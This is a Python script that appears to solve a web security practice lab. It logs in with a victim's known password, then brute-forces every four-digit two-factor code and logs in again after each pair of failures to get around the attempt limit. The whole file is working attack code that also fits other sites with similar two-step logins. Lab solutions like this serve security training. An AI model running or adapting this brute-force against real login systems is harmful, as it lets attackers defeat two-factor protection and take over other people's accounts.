import requests
import re
from colorama import Fore, Style, init
import sys


class LabSolver:
    def __init__(self, lab_url):
        self.lab_url = lab_url if lab_url.endswith('/') else lab_url + '/'
        self.session = requests.Session()
        init()
        self.victim_username = 'carlos'
        self.victim_password = 'montoya'
        self.mfa_codes = [f'{i:04}' for i in range(10000)]

    def get_csrf_token(self, path):
        response = self.session.get(self.lab_url + path)
        csrf = re.search('value="(.*)"', response.text).group(1)
        return csrf

    def sign_in(self):
        data = {
            'csrf': self.get_csrf_token('login'),
            'username': self.victim_username,
            'password': self.victim_password
        }
        self.session.post(self.lab_url + 'login', data=data)

    def brute_force_mfa_codes(self):
        i = 0
        self.sign_in()
        csrf = self.get_csrf_token('login2')
        for mfa_code in self.mfa_codes:
            if i == 2:
                self.sign_in()
                csrf = self.get_csrf_token('login2')
                i = 0
            data = {
                'csrf': csrf,
                'mfa-code': mfa_code
            }
            response = self.session.post(self.lab_url + 'login2', data=data)
            if 'Incorrect security code' in response.text:
                print(Fore.RED + '[-] ' + Style.RESET_ALL + mfa_code)
            else:
                print(Fore.GREEN + '[+] ' + Style.RESET_ALL + mfa_code)
                break
            i += 1

    def checking_solution(self):
        response = self.session.get(self.lab_url)
        if 'Congratulations, you solved the lab!' in response.text:
            print('You solved the lab.')
            print('Coded by Mohamed Ahmed (ma4747gh).')
            print('My GitHub account: https://github.com/ma4747gh')
            print('My LinkedIn account: https://eg.linkedin.com/in/ma4747gh')

    def solve(self):
        self.brute_force_mfa_codes()
        self.checking_solution()


lab_solver = LabSolver(sys.argv[1])
lab_solver.solve()
